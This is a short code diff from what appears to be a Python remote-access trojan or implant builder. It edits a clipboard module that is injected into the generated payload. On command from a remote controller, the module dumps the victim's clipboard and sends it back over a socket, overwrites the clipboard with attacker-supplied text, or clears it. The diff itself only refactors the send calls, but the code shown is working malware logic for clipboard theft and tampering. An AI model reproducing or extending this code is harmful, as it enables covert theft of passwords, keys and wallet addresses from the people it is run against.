@@ -11,13 +11,13 @@ def clip_logger(option):
     flag = option.split(' ',1)
     if flag[0] == 'clip_dump':
         data = pyperclip.paste()
-        s.sendall(('[+]Got clipboard data : \\n' + data).encode())
+        send_all(s,'[+]Got clipboard data : \\n' + data)
     elif flag[0] == 'clip_set':
         pyperclip.copy(flag[1])
-        s.sendall(('[+]Set clipboard text to : ' + flag[1]).encode())
+        send_all(s,'[+]Set clipboard text to : ' + flag[1])
     elif flag[0] == 'clip_clear':
         pyperclip.copy('')
-        s.sendall('[+]Cleared clipboard'.encode())''')
+        send_all(s,'[+]Cleared clipboard')''')
         config.logics.append('''
             elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                 clip_logger(data)''')
